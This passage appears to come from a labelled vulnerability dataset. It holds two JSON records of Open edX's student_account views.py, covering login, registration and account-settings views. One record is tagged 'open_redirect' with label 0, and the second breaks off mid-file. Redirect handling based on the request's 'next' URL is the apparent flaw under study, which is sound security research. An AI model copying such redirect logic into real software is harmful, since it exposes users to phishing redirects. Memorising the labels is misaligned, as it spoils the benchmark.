openedx.core.djangoapps.site_configuration import helpers as configuration_helpers\nfrom openedx.core.djangoapps.theming.helpers import is_request_in_themed_site\nfrom openedx.core.djangoapps.user_api.accounts.api import request_password_change\nfrom openedx.core.djangoapps.user_api.errors import UserNotFound\nfrom openedx.core.lib.edx_api_utils import get_edx_api_data\nfrom openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES\nfrom openedx.features.enterprise_support.api import enterprise_customer_for_request\nfrom student.helpers import destroy_oauth_tokens, get_next_url_for_login_page\nfrom student.models import UserProfile\nfrom student.views import register_user as old_register_view\nfrom student.views import signin_user as old_login_view\nfrom third_party_auth import pipeline\nfrom third_party_auth.decorators import xframe_allow_whitelisted\nfrom util.bad_request_rate_limiter import BadRequestRateLimiter\nfrom util.date_utils import strftime_localized\n\nAUDIT_LOG = logging.getLogger(\"audit\")\nlog = logging.getLogger(__name__)\nUser = get_user_model()  # pylint:disable=invalid-name\n\n\n@require_http_methods(['GET'])\n@ensure_csrf_cookie\n@xframe_allow_whitelisted\ndef login_and_registration_form(request, initial_mode=\"login\"):\n    \"\"\"Render the combined login/registration form, defaulting to login\n\n    This relies on the JS to asynchronously load the actual form from\n    the user_api.\n\n    Keyword Args:\n        initial_mode (string): Either \"login\" or \"register\".\n\n    \"\"\"\n    # Determine the URL to redirect to following login/registration/third_party_auth\n    redirect_to = get_next_url_for_login_page(request)\n    # If we're already logged in, redirect to the dashboard\n    if request.user.is_authenticated():\n        return redirect(redirect_to)\n\n    # Retrieve the form descriptions from the user API\n    form_descriptions = _get_form_descriptions(request)\n\n    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.\n    # If present, we display a login page focused on third-party auth with that provider.\n    third_party_auth_hint = None\n    if '?' in redirect_to:\n        try:\n            next_args = urlparse.parse_qs(urlparse.urlparse(redirect_to).query)\n            provider_id = next_args['tpa_hint'][0]\n            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)\n            if tpa_hint_provider:\n                if tpa_hint_provider.skip_hinted_login_dialog:\n                    # Forward the user directly to the provider's login URL when the provider is configured\n                    # to skip the dialog.\n                    if initial_mode == \"register\":\n                        auth_entry = pipeline.AUTH_ENTRY_REGISTER\n                    else:\n                        auth_entry = pipeline.AUTH_ENTRY_LOGIN\n                    return redirect(\n                        pipeline.get_login_url(provider_id, auth_entry, redirect_url=redirect_to)\n                    )\n                third_party_auth_hint = provider_id\n                initial_mode = \"hinted_login\"\n        except (KeyError, ValueError, IndexError) as ex:\n            log.error(\"Unknown tpa_hint provider: %s\", ex)\n\n    # If this is a themed site, revert to the old login/registration pages.\n    # We need to do this for now to support existing themes.\n    # Themed sites can use the new logistration page by setting\n    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their\n    # configuration settings.\n    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):\n        if initial_mode == \"login\":\n            return old_login_view(request)\n        elif initial_mode == \"register\":\n            return old_register_view(request)\n\n    # Allow external auth to intercept and handle the request\n    ext_auth_response = _external_auth_intercept(request, initial_mode)\n    if ext_auth_response is not None:\n        return ext_auth_response\n\n    # Account activation message\n    account_activation_messages = [\n        {\n            'message': message.message, 'tags': message.tags\n        } for message in messages.get_messages(request) if 'account-activation' in message.tags\n    ]\n\n    # Otherwise, render the combined login/registration page\n    context = {\n        'data': {\n            'login_redirect_url': redirect_to,\n            'initial_mode': initial_mode,\n            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),\n            'third_party_auth_hint': third_party_auth_hint or '',\n            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),\n            'password_reset_support_link': configuration_helpers.get_value(\n                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n            ) or settings.SUPPORT_SITE_LINK,\n            'account_activation_messages': account_activation_messages,\n\n            # Include form descriptions retrieved from the user API.\n            # We could have the JS client make these requests directly,\n            # but we include them in the initial page load to avoid\n            # the additional round-trip to the server.\n            'login_form_desc': json.loads(form_descriptions['login']),\n            'registration_form_desc': json.loads(form_descriptions['registration']),\n            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),\n            'account_creation_allowed': configuration_helpers.get_value(\n                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))\n        },\n        'login_redirect_url': redirect_to,  # This gets added to the query string of the \"Sign In\" button in header\n        'responsive': True,\n        'allow_iframing': True,\n        'disable_courseware_js': True,\n        'combined_login_and_register': True,\n        'disable_footer': not configuration_helpers.get_value(\n            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',\n            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']\n        ),\n    }\n\n    context = update_context_for_enterprise(request, context)\n\n    return render_to_response('student_account/login_and_register.html', context)\n\n\n@require_http_methods(['POST'])\ndef password_change_request_handler(request):\n    \"\"\"Handle password change requests originating from the account page.\n\n    Uses the Account API to email the user a link to the password reset page.\n\n    Note:\n        The next step in the password reset process (confirmation) is currently handled\n        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's\n        password reset confirmation view.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the email was sent successfully\n        HttpResponse: 400 if there is no 'email' POST parameter\n        HttpResponse: 403 if the client has been rate limited\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        POST /account/password\n\n    \"\"\"\n\n    limiter = BadRequestRateLimiter()\n    if limiter.is_rate_limit_exceeded(request):\n        AUDIT_LOG.warning(\"Password reset rate limit exceeded\")\n        return HttpResponseForbidden()\n\n    user = request.user\n    # Prefer logged-in user's email\n    email = user.email if user.is_authenticated() else request.POST.get('email')\n\n    if email:\n        try:\n            request_password_change(email, request.is_secure())\n            user = user if user.is_authenticated() else User.objects.get(email=email)\n            destroy_oauth_tokens(user)\n        except UserNotFound:\n            AUDIT_LOG.info(\"Invalid password reset attempt\")\n            # Increment the rate limit counter\n            limiter.tick_bad_request_counter(request)\n\n        return HttpResponse(status=200)\n    else:\n        return HttpResponseBadRequest(_(\"No email address provided.\"))\n\n\ndef update_context_for_enterprise(request, context):\n    \"\"\"\n    Take the processed context produced by the view, determine if it's relevant\n    to a particular Enterprise Customer, and update it to include that customer's\n    enterprise metadata.\n    \"\"\"\n\n    context = context.copy()\n\n    sidebar_context = enterprise_sidebar_context(request)\n\n    if sidebar_context:\n        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(\n            context['data']['registration_form_desc']\n        )\n        context.update(sidebar_context)\n        context['enable_enterprise_sidebar'] = True\n        context['data']['hide_auth_warnings'] = True\n    else:\n        context['enable_enterprise_sidebar'] = False\n\n    return context\n\n\ndef enterprise_fields_only(fields):\n    \"\"\"\n    Take the received field definition, and exclude those fields that we don't want\n    to require if the user is going to be a member of an Enterprise Customer.\n    \"\"\"\n    enterprise_exclusions = configuration_helpers.get_value(\n        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',\n        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS\n    )\n    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]\n\n\ndef enterprise_sidebar_context(request):\n    \"\"\"\n    Given the current request, render the HTML of a sidebar for the current\n    logistration view that depicts Enterprise-related information.\n    \"\"\"\n    enterprise_customer = enterprise_customer_for_request(request)\n\n    if not enterprise_customer:\n        return {}\n\n    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)\n\n    if enterprise_customer.branding_configuration.logo:\n        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url\n    else:\n        enterprise_logo_url = ''\n\n    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):\n        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message\n    else:\n        branded_welcome_template = configuration_helpers.get_value(\n            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',\n            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE\n        )\n\n    branded_welcome_string = branded_welcome_template.format(\n        start_bold=u'<b>',\n        end_bold=u'</b>',\n        enterprise_name=enterprise_customer.name,\n        platform_name=platform_name\n    )\n\n    platform_welcome_template = configuration_helpers.get_value(\n        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',\n        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE\n    )\n    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)\n\n    context = {\n        'enterprise_name': enterprise_customer.name,\n        'enterprise_logo_url': enterprise_logo_url,\n        'enterprise_branded_welcome_string': branded_welcome_string,\n        'platform_welcome_string': platform_welcome_string,\n    }\n\n    return context\n\n\ndef _third_party_auth_context(request, redirect_to, tpa_hint=None):\n    \"\"\"Context for third party auth providers and the currently running pipeline.\n\n    Arguments:\n        request (HttpRequest): The request, used to determine if a pipeline\n            is currently running.\n        redirect_to: The URL to send the user to following successful\n            authentication.\n        tpa_hint (string): An override flag that will return a matching provider\n            as long as its configuration has been enabled\n\n    Returns:\n        dict\n\n    \"\"\"\n    context = {\n        \"currentProvider\": None,\n        \"providers\": [],\n        \"secondaryProviders\": [],\n        \"finishAuthUrl\": None,\n        \"errorMessage\": None,\n    }\n\n    if third_party_auth.is_enabled():\n        if not enterprise_customer_for_request(request):\n            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):\n                info = {\n                    \"id\": enabled.provider_id,\n                    \"name\": enabled.name,\n                    \"iconClass\": enabled.icon_class or None,\n                    \"iconImage\": enabled.icon_image.url if enabled.icon_image else None,\n                    \"loginUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_LOGIN,\n                        redirect_url=redirect_to,\n                    ),\n                    \"registerUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_REGISTER,\n                        redirect_url=redirect_to,\n                    ),\n                }\n                context[\"providers\" if not enabled.secondary else \"secondaryProviders\"].append(info)\n\n        running_pipeline = pipeline.get(request)\n        if running_pipeline is not None:\n            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)\n\n            if current_provider is not None:\n                context[\"currentProvider\"] = current_provider.name\n                context[\"finishAuthUrl\"] = pipeline.get_complete_url(current_provider.backend_name)\n\n                if current_provider.skip_registration_form:\n                    # As a reliable way of \"skipping\" the registration form, we just submit it automatically\n                    context[\"autoSubmitRegForm\"] = True\n\n        # Check for any error messages we may want to display:\n        for msg in messages.get_messages(request):\n            if msg.extra_tags.split()[0] == \"social-auth\":\n                # msg may or may not be translated. Try translating [again] in case we are able to:\n                context['errorMessage'] = _(unicode(msg))  # pylint: disable=translation-of-non-string\n                break\n\n    return context\n\n\ndef _get_form_descriptions(request):\n    \"\"\"Retrieve form descriptions from the user API.\n\n    Arguments:\n        request (HttpRequest): The original request, used to retrieve session info.\n\n    Returns:\n        dict: Keys are 'login', 'registration', and 'password_reset';\n            values are the JSON-serialized form descriptions.\n\n    \"\"\"\n    return {\n        'login': _local_server_get('/user_api/v1/account/login_session/', request.session),\n        'registration': _local_server_get('/user_api/v1/account/registration/', request.session),\n        'password_reset': _local_server_get('/user_api/v1/account/password_reset/', request.session)\n    }\n\n\ndef _local_server_get(url, session):\n    \"\"\"Simulate a server-server GET request for an in-process API.\n\n    Arguments:\n        url (str): The URL of the request (excluding the protocol and domain)\n        session (SessionStore): The session of the original request,\n            used to get past the CSRF checks.\n\n    Returns:\n        str: The content of the response\n\n    \"\"\"\n    # Since the user API is currently run in-process,\n    # we simulate the server-server API call by constructing\n    # our own request object.  We don't need to include much\n    # information in the request except for the session\n    # (to get past through CSRF validation)\n    request = HttpRequest()\n    request.method = \"GET\"\n    request.session = session\n\n    # Call the Django view function, simulating\n    # the server-server API call\n    view, args, kwargs = resolve(url)\n    response = view(request, *args, **kwargs)\n\n    # Return the content of the response\n    return response.content\n\n\ndef _external_auth_intercept(request, mode):\n    \"\"\"Allow external auth to intercept a login/registration request.\n\n    Arguments:\n        request (Request): The original request.\n        mode (str): Either \"login\" or \"register\"\n\n    Returns:\n        Response or None\n\n    \"\"\"\n    if mode == \"login\":\n        return external_auth_login(request)\n    elif mode == \"register\":\n        return external_auth_register(request)\n\n\ndef get_user_orders(user):\n    \"\"\"Given a user, get the detail of all the orders from the Ecommerce service.\n\n    Args:\n        user (User): The user to authenticate as when requesting ecommerce.\n\n    Returns:\n        list of dict, representing orders returned by the Ecommerce service.\n    \"\"\"\n    no_data = []\n    user_orders = []\n    commerce_configuration = CommerceConfiguration.current()\n    user_query = {'username': user.username}\n\n    use_cache = commerce_configuration.is_cache_enabled\n    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None\n    api = ecommerce_api_client(user)\n    commerce_user_orders = get_edx_api_data(\n        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key\n    )\n\n    for order in commerce_user_orders:\n        if order['status'].lower() == 'complete':\n            date_placed = datetime.strptime(order['date_placed'], \"%Y-%m-%dT%H:%M:%SZ\")\n            order_data = {\n                'number': order['number'],\n                'price': order['total_excl_tax'],\n                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),\n                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),\n                'lines': order['lines'],\n            }\n            user_orders.append(order_data)\n\n    return user_orders\n\n\n@login_required\n@require_http_methods(['GET'])\ndef account_settings(request):\n    \"\"\"Render the current user's account settings page.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/settings\n\n    \"\"\"\n    return render_to_response('student_account/account_settings.html', account_settings_context(request))\n\n\n@login_required\n@require_http_methods(['GET'])\ndef finish_auth(request):  # pylint: disable=unused-argument\n    \"\"\" Following logistration (1st or 3rd party), handle any special query string params.\n\n    See FinishAuthView.js for details on the query string params.\n\n    e.g. auto-enroll the user in a course, set email opt-in preference.\n\n    This view just displays a \"Please wait\" message while AJAX calls are made to enroll the\n    user in the course etc. This view is only used if a parameter like \"course_id\" is present\n    during login/registration/third_party_auth. Otherwise, there is no need for it.\n\n    Ideally this view will finish and redirect to the next step before the user even sees it.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll\n\n    \"\"\"\n    return render_to_response('student_account/finish_auth.html', {\n        'disable_courseware_js': True,\n        'disable_footer': True,\n    })\n\n\ndef account_settings_context(request):\n    \"\"\" Context for the account settings page.\n\n    Args:\n        request: The request object.\n\n    Returns:\n        dict\n\n    \"\"\"\n    user = request.user\n\n    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]\n    try:\n        user_orders = get_user_orders(user)\n    except:  # pylint: disable=bare-except\n        log.exception('Error fetching order history from Otto.')\n        # Return empty order list as account settings page expect a list and\n        # it will be broken if exception raised\n        user_orders = []\n\n    context = {\n        'auth': {},\n        'duplicate_provider': None,\n        'nav_hidden': True,\n        'fields': {\n            'country': {\n                'options': list(countries),\n            }, 'gender': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'language': {\n                'options': released_languages(),\n            }, 'level_of_education': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'password': {\n                'url': reverse('password_reset'),\n            }, 'year_of_birth': {\n                'options': year_of_birth_options,\n            }, 'preferred_language': {\n                'options': all_languages(),\n            }, 'time_zone': {\n                'options': TIME_ZONE_CHOICES,\n            }\n        },\n        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n        'password_reset_support_link': configuration_helpers.get_value(\n            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n        ) or settings.SUPPORT_SITE_LINK,\n        'user_accounts_api_url': reverse(\"accounts_api\", kwargs={'username': user.username}),\n        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),\n        'disable_courseware_js': True,\n        'show_program_listing': ProgramsApiConfig.is_enabled(),\n        'order_history': user_orders\n    }\n\n    if third_party_auth.is_enabled():\n        # If the account on the third party provider is already connected with another edX account,\n        # we display a message to the user.\n        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))\n\n        auth_states = pipeline.get_provider_user_states(user)\n\n        context['auth']['providers'] = [{\n            'id': state.provider.provider_id,\n            'name': state.provider.name,  # The name of the provider e.g. Facebook\n            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.\n            # If the user is not connected, they should be directed to this page to authenticate\n            # with the particular provider, as long as the provider supports initiating a login.\n            'connect_url': pipeline.get_login_url(\n                state.provider.provider_id,\n                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,\n                # The url the user should be directed to after the auth process has completed.\n                redirect_url=reverse('account_settings'),\n            ),\n            'accepts_logins': state.provider.accepts_logins,\n            # If the user is connected, sending a POST request to this url removes the connection\n            # information for this provider from their edX account.\n            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),\n            # We only want to include providers if they are either currently available to be logged\n            # in with, or if the user is already authenticated with them.\n        } for state in auth_states if state.provider.display_for_login or state.has_account]\n\n    return context\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "43b55308a6467a5b8880bb40b71ec0821cb76398", "code": "/lms/djangoapps/student_account/views.py/n/n\"\"\" Views for a student's account information. \"\"\"\n\nimport json\nimport logging\nimport urlparse\nfrom datetime import datetime\n\nimport pytz\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth.decorators import login_required\nfrom django.core.urlresolvers import resolve, reverse\nfrom django.http import HttpRequest, HttpResponse, HttpResponseBadRequest, HttpResponseForbidden\nfrom django.shortcuts import redirect\nfrom django.utils.translation import ugettext as _\nfrom django.views.decorators.csrf import ensure_csrf_cookie\nfrom django.views.decorators.http import require_http_methods\nfrom django_countries import countries\n\nimport third_party_auth\nfrom commerce.models import CommerceConfiguration\nfrom edxmako.shortcuts import render_to_response, render_to_string\nfrom lms.djangoapps.commerce.utils import EcommerceService\nfrom openedx.core.djangoapps.commerce.utils import ecommerce_api_client\nfrom openedx.core.djangoapps.external_auth.login_and_register import login as external_auth_login\nfrom openedx.core.djangoapps.external_auth.login_and_register import register as external_auth_register\nfrom openedx.core.djangoapps.lang_pref.api import all_languages, released_languages\nfrom openedx.core.djangoapps.programs.models import ProgramsApiConfig\nfrom openedx.core.djangoapps.site_configuration import helpers as configuration_helpers\nfrom openedx.core.djangoapps.theming.helpers import is_request_in_themed_site\nfrom openedx.core.djangoapps.user_api.accounts.api import request_password_change\nfrom openedx.core.djangoapps.user_api.errors import UserNotFound\nfrom openedx.core.lib.edx_api_utils import get_edx_api_data\nfrom openedx.core.lib.time_zone_utils import TIME_ZONE_CHOICES\nfrom openedx.features.enterprise_support.api import enterprise_customer_for_request\nfrom student.helpers import destroy_oauth_tokens, get_next_url_for_login_page\nfrom student.models import UserProfile\nfrom student.views import register_user as old_register_view\nfrom student.views import signin_user as old_login_view\nfrom third_party_auth import pipeline\nfrom third_party_auth.decorators import xframe_allow_whitelisted\nfrom util.bad_request_rate_limiter import BadRequestRateLimiter\nfrom util.date_utils import strftime_localized\n\nAUDIT_LOG = logging.getLogger(\"audit\")\nlog = logging.getLogger(__name__)\nUser = get_user_model()  # pylint:disable=invalid-name\n\n\n@require_http_methods(['GET'])\n@ensure_csrf_cookie\n@xframe_allow_whitelisted\ndef login_and_registration_form(request, initial_mode=\"login\"):\n    \"\"\"Render the combined login/registration form, defaulting to login\n\n    This relies on the JS to asynchronously load the actual form from\n    the user_api.\n\n    Keyword Args:\n        initial_mode (string): Either \"login\" or \"register\".\n\n    \"\"\"\n    # Determine the URL to redirect to following login/registration/third_party_auth\n    redirect_to = get_next_url_for_login_page(request)\n    # If we're already logged in, redirect to the dashboard\n    if request.user.is_authenticated():\n        return redirect(redirect_to)\n\n    # Retrieve the form descriptions from the user API\n    form_descriptions = _get_form_descriptions(request)\n\n    # Our ?next= URL may itself contain a parameter 'tpa_hint=x' that we need to check.\n    # If present, we display a login page focused on third-party auth with that provider.\n    third_party_auth_hint = None\n    if '?' in redirect_to:\n        try:\n            next_args = urlparse.parse_qs(urlparse.urlparse(redirect_to).query)\n            provider_id = next_args['tpa_hint'][0]\n            tpa_hint_provider = third_party_auth.provider.Registry.get(provider_id=provider_id)\n            if tpa_hint_provider:\n                if tpa_hint_provider.skip_hinted_login_dialog:\n                    # Forward the user directly to the provider's login URL when the provider is configured\n                    # to skip the dialog.\n                    return redirect(\n                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)\n                    )\n                third_party_auth_hint = provider_id\n                initial_mode = \"hinted_login\"\n        except (KeyError, ValueError, IndexError):\n            pass\n\n    # If this is a themed site, revert to the old login/registration pages.\n    # We need to do this for now to support existing themes.\n    # Themed sites can use the new logistration page by setting\n    # 'ENABLE_COMBINED_LOGIN_REGISTRATION' in their\n    # configuration settings.\n    if is_request_in_themed_site() and not configuration_helpers.get_value('ENABLE_COMBINED_LOGIN_REGISTRATION', False):\n        if initial_mode == \"login\":\n            return old_login_view(request)\n        elif initial_mode == \"register\":\n            return old_register_view(request)\n\n    # Allow external auth to intercept and handle the request\n    ext_auth_response = _external_auth_intercept(request, initial_mode)\n    if ext_auth_response is not None:\n        return ext_auth_response\n\n    # Account activation message\n    account_activation_messages = [\n        {\n            'message': message.message, 'tags': message.tags\n        } for message in messages.get_messages(request) if 'account-activation' in message.tags\n    ]\n\n    # Otherwise, render the combined login/registration page\n    context = {\n        'data': {\n            'login_redirect_url': redirect_to,\n            'initial_mode': initial_mode,\n            'third_party_auth': _third_party_auth_context(request, redirect_to, third_party_auth_hint),\n            'third_party_auth_hint': third_party_auth_hint or '',\n            'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n            'support_link': configuration_helpers.get_value('SUPPORT_SITE_LINK', settings.SUPPORT_SITE_LINK),\n            'password_reset_support_link': configuration_helpers.get_value(\n                'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n            ) or settings.SUPPORT_SITE_LINK,\n            'account_activation_messages': account_activation_messages,\n\n            # Include form descriptions retrieved from the user API.\n            # We could have the JS client make these requests directly,\n            # but we include them in the initial page load to avoid\n            # the additional round-trip to the server.\n            'login_form_desc': json.loads(form_descriptions['login']),\n            'registration_form_desc': json.loads(form_descriptions['registration']),\n            'password_reset_form_desc': json.loads(form_descriptions['password_reset']),\n            'account_creation_allowed': configuration_helpers.get_value(\n                'ALLOW_PUBLIC_ACCOUNT_CREATION', settings.FEATURES.get('ALLOW_PUBLIC_ACCOUNT_CREATION', True))\n        },\n        'login_redirect_url': redirect_to,  # This gets added to the query string of the \"Sign In\" button in header\n        'responsive': True,\n        'allow_iframing': True,\n        'disable_courseware_js': True,\n        'combined_login_and_register': True,\n        'disable_footer': not configuration_helpers.get_value(\n            'ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER',\n            settings.FEATURES['ENABLE_COMBINED_LOGIN_REGISTRATION_FOOTER']\n        ),\n    }\n\n    context = update_context_for_enterprise(request, context)\n\n    return render_to_response('student_account/login_and_register.html', context)\n\n\n@require_http_methods(['POST'])\ndef password_change_request_handler(request):\n    \"\"\"Handle password change requests originating from the account page.\n\n    Uses the Account API to email the user a link to the password reset page.\n\n    Note:\n        The next step in the password reset process (confirmation) is currently handled\n        by student.views.password_reset_confirm_wrapper, a custom wrapper around Django's\n        password reset confirmation view.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the email was sent successfully\n        HttpResponse: 400 if there is no 'email' POST parameter\n        HttpResponse: 403 if the client has been rate limited\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        POST /account/password\n\n    \"\"\"\n\n    limiter = BadRequestRateLimiter()\n    if limiter.is_rate_limit_exceeded(request):\n        AUDIT_LOG.warning(\"Password reset rate limit exceeded\")\n        return HttpResponseForbidden()\n\n    user = request.user\n    # Prefer logged-in user's email\n    email = user.email if user.is_authenticated() else request.POST.get('email')\n\n    if email:\n        try:\n            request_password_change(email, request.is_secure())\n            user = user if user.is_authenticated() else User.objects.get(email=email)\n            destroy_oauth_tokens(user)\n        except UserNotFound:\n            AUDIT_LOG.info(\"Invalid password reset attempt\")\n            # Increment the rate limit counter\n            limiter.tick_bad_request_counter(request)\n\n        return HttpResponse(status=200)\n    else:\n        return HttpResponseBadRequest(_(\"No email address provided.\"))\n\n\ndef update_context_for_enterprise(request, context):\n    \"\"\"\n    Take the processed context produced by the view, determine if it's relevant\n    to a particular Enterprise Customer, and update it to include that customer's\n    enterprise metadata.\n    \"\"\"\n\n    context = context.copy()\n\n    sidebar_context = enterprise_sidebar_context(request)\n\n    if sidebar_context:\n        context['data']['registration_form_desc']['fields'] = enterprise_fields_only(\n            context['data']['registration_form_desc']\n        )\n        context.update(sidebar_context)\n        context['enable_enterprise_sidebar'] = True\n        context['data']['hide_auth_warnings'] = True\n    else:\n        context['enable_enterprise_sidebar'] = False\n\n    return context\n\n\ndef enterprise_fields_only(fields):\n    \"\"\"\n    Take the received field definition, and exclude those fields that we don't want\n    to require if the user is going to be a member of an Enterprise Customer.\n    \"\"\"\n    enterprise_exclusions = configuration_helpers.get_value(\n        'ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS',\n        settings.ENTERPRISE_EXCLUDED_REGISTRATION_FIELDS\n    )\n    return [field for field in fields['fields'] if field['name'] not in enterprise_exclusions]\n\n\ndef enterprise_sidebar_context(request):\n    \"\"\"\n    Given the current request, render the HTML of a sidebar for the current\n    logistration view that depicts Enterprise-related information.\n    \"\"\"\n    enterprise_customer = enterprise_customer_for_request(request)\n\n    if not enterprise_customer:\n        return {}\n\n    platform_name = configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME)\n\n    if enterprise_customer.branding_configuration.logo:\n        enterprise_logo_url = enterprise_customer.branding_configuration.logo.url\n    else:\n        enterprise_logo_url = ''\n\n    if getattr(enterprise_customer.branding_configuration, 'welcome_message', None):\n        branded_welcome_template = enterprise_customer.branding_configuration.welcome_message\n    else:\n        branded_welcome_template = configuration_helpers.get_value(\n            'ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE',\n            settings.ENTERPRISE_SPECIFIC_BRANDED_WELCOME_TEMPLATE\n        )\n\n    branded_welcome_string = branded_welcome_template.format(\n        start_bold=u'<b>',\n        end_bold=u'</b>',\n        enterprise_name=enterprise_customer.name,\n        platform_name=platform_name\n    )\n\n    platform_welcome_template = configuration_helpers.get_value(\n        'ENTERPRISE_PLATFORM_WELCOME_TEMPLATE',\n        settings.ENTERPRISE_PLATFORM_WELCOME_TEMPLATE\n    )\n    platform_welcome_string = platform_welcome_template.format(platform_name=platform_name)\n\n    context = {\n        'enterprise_name': enterprise_customer.name,\n        'enterprise_logo_url': enterprise_logo_url,\n        'enterprise_branded_welcome_string': branded_welcome_string,\n        'platform_welcome_string': platform_welcome_string,\n    }\n\n    return context\n\n\ndef _third_party_auth_context(request, redirect_to, tpa_hint=None):\n    \"\"\"Context for third party auth providers and the currently running pipeline.\n\n    Arguments:\n        request (HttpRequest): The request, used to determine if a pipeline\n            is currently running.\n        redirect_to: The URL to send the user to following successful\n            authentication.\n        tpa_hint (string): An override flag that will return a matching provider\n            as long as its configuration has been enabled\n\n    Returns:\n        dict\n\n    \"\"\"\n    context = {\n        \"currentProvider\": None,\n        \"providers\": [],\n        \"secondaryProviders\": [],\n        \"finishAuthUrl\": None,\n        \"errorMessage\": None,\n    }\n\n    if third_party_auth.is_enabled():\n        if not enterprise_customer_for_request(request):\n            for enabled in third_party_auth.provider.Registry.displayed_for_login(tpa_hint=tpa_hint):\n                info = {\n                    \"id\": enabled.provider_id,\n                    \"name\": enabled.name,\n                    \"iconClass\": enabled.icon_class or None,\n                    \"iconImage\": enabled.icon_image.url if enabled.icon_image else None,\n                    \"loginUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_LOGIN,\n                        redirect_url=redirect_to,\n                    ),\n                    \"registerUrl\": pipeline.get_login_url(\n                        enabled.provider_id,\n                        pipeline.AUTH_ENTRY_REGISTER,\n                        redirect_url=redirect_to,\n                    ),\n                }\n                context[\"providers\" if not enabled.secondary else \"secondaryProviders\"].append(info)\n\n        running_pipeline = pipeline.get(request)\n        if running_pipeline is not None:\n            current_provider = third_party_auth.provider.Registry.get_from_pipeline(running_pipeline)\n\n            if current_provider is not None:\n                context[\"currentProvider\"] = current_provider.name\n                context[\"finishAuthUrl\"] = pipeline.get_complete_url(current_provider.backend_name)\n\n                if current_provider.skip_registration_form:\n                    # As a reliable way of \"skipping\" the registration form, we just submit it automatically\n                    context[\"autoSubmitRegForm\"] = True\n\n        # Check for any error messages we may want to display:\n        for msg in messages.get_messages(request):\n            if msg.extra_tags.split()[0] == \"social-auth\":\n                # msg may or may not be translated. Try translating [again] in case we are able to:\n                context['errorMessage'] = _(unicode(msg))  # pylint: 